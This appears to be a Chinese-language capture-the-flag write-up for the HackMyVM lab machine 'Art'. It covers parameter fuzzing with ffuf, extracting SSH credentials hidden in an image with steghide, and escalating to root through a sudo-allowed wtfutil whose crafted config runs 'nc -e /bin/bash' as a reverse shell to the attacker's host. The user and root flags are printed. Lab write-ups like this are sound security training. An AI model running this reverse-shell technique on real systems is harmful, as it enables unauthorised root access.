# Quick

2024-11-04 https://hackmyvm.eu/machines/machine.php?vm=Art

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 index.php 看到是图片，查看 html 源码，发现提示 `<!-- Need to solve tag parameter problem. -->`

ffuf 找到了隐藏的参数 tag：

```
ffuf -c -t 20 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.5.40/index.php?FUZZ=ls -fs 170
```

尝试是否有 LFI 漏洞，但是没有找到能读取的系统文件：

```
ffuf -c -t 20 -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://192.168.5.40/index.php?tag=FUZZ -fs 70
```

继续看看有没有其隐藏的文件可以读取：

```
ffuf -c -t 20 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.5.40/index.php?tag=FUZZ -fs 70
```

发现了个参数值：beauty

访问 http://192.168.5.40/index.php?tag=beauty 发现了一张奶牛图片 dsa32.jpg ，将其下载，查看是否有隐写内容。经过 exiftools binwalk steghide 后，发现隐写信息

```
steghide info dsa32.jpg

Enter passphrase:
  embedded file "yes.txt":
    size: 17.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

解压出隐写信息：

```
steghide --extract -sf dsa32.jpg

cat yes.txt
lion/shel0vesyou
```

使用 lion/shel0vesyou ssh 登陆，得到了 user flag：

```
lion@art:~$ cat user.txt
HMVygUmTyvRPWduINKYfmpO
```

寻找提权至 root 的方法，sudo -l 发现：

```
(ALL : ALL) NOPASSWD: /bin/wtfutil
```

创建 config.yml 配置文件，利用 wtfutil 反弹 shell：

```
wtf:
  grid:
    columns: [35, 35, 35]
    rows: [10, 10, 10, 10]
  refreshInterval: 1
  mods:
    todo:
      checkedIcon: "X"
      colors:
        checked: gray
        highlight:
          fore: "black"
          back: "orange"
      enabled: true
      position:
        top: 0
        left: 0
        height: 2
        width: 1
      title: "shell"
      refreshInterval: 3600
      args: ['-e','/bin/bash','192.168.5.3','8888']
      cmd: "nc"
      type: cmdrunner
```

```
nc -lvnp 8888

sudo /bin/wtfutil --config=config.yml
```

得到了反弹的 root shell：

```
find / -type f -name root.txt 2>/dev/null
/var/opt/root.txt

cat /var/opt/root.txt
mZxbPCjEQYOqkNCuyIuTHMV
```
